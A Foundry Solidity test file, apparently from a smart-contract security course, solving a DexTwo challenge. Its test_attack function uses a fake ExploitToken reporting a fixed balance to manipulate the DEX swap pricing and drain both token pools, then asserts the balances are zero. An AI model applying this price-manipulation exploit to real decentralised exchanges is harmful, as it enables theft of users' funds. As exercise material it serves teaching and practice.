// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "week10-11-security2/DexTwo.sol";

contract DexTwoTest is Test {
    DexTwo dex;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;
    ExploitToken exploitToken;

    function setUp() external {
        dex = new DexTwo();

        token1 = new SwappableTokenTwo(address(dex), "token1", "T1", 100);
        token2 = new SwappableTokenTwo(address(dex), "token2", "T2", 100);

        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);
    }

    function test_setUp() external {
        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);
        assertEq(token1.balanceOf(address(this)), 0);
        assertEq(token2.balanceOf(address(this)), 0);
    }

    function test_attack() external {
        // ExploitToken has a fixed balance of 1 for any address.  This is will
        // manipulate the dex pricing function to send the full amount in any
        // swap.
        exploitToken = new ExploitToken();

        _getBalances("Before swap");

        // First swap will drain token1
        dex.swap(address(exploitToken), address(token1), 1);

        _getBalances("After swap1");

        // Second swap will drain token2
        dex.swap(address(exploitToken), address(token2), 1);

        _getBalances("After swap2");

        _checkSolved();
    }

    function _checkSolved() internal {
        // Token1 balance is drained from dex
        assertEq(token1.balanceOf(address(dex)), 0);

        // Token2 balance is drained from dex
        assertEq(token2.balanceOf(address(dex)), 0);
    }

    function _getBalances(string memory message) internal view {
        console.log(message);
        console.log("token1.balanceOf(dex)", token1.balanceOf(address(dex)));
        console.log("token2.balanceOf(dex)", token2.balanceOf(address(dex)));
        console.log(
            "exploit.balanceOf(dex)",
            exploitToken.balanceOf(address(dex))
        );
        console.log("token1.balanceOf(test)", token1.balanceOf(address(this)));
        console.log("token2.balanceOf(test)", token2.balanceOf(address(this)));
        console.log(
            "exploit.balanceOf(test)",
            exploitToken.balanceOf(address(this))
        );
    }
}
